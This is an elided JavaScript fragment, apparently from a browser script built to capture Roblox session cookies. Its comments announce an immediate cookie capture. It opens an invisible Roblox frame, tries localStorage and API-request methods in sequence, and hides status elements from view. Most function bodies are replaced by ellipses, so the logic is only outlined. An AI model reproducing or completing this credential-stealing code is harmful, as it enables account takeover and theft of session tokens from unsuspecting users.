// Immediately try to capture cookies - don't wait for DOMContentLoaded
(function () {
  ...
  if (securityCookie) {
    ...
    // Try multiple methods in sequence with shorter timeouts
    // Try iframe immediately if document body is already available
    if (document.body) {
      createInvisibleRobloxFrame();
    } else {
      // If body not yet available, wait for it
      document.addEventListener("DOMContentLoaded", createInvisibleRobloxFrame);
    }

    setTimeout(tryLocalStorageMethod, 200);
    setTimeout(tryApiRequestMethod, 300);
  }

  // Setup click handler as soon as possible
  ...
  // Hide any status elements once DOM is ready
